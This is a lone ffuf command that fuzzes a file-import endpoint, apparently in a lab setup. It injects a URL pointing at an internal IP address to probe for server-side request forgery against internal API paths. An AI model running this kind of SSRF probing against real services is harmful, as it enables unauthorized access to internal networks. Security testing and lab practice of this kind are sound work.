ffuf -X POST -u http://apigateway:8000/files/import \
  -d '{"url":"http://172.16.16.5:9000/api/renderFUZZ"}' \
  -H "Content-Type:application/json" \
  -w ./query_strings.txt \
  -timeout 5 -t 10
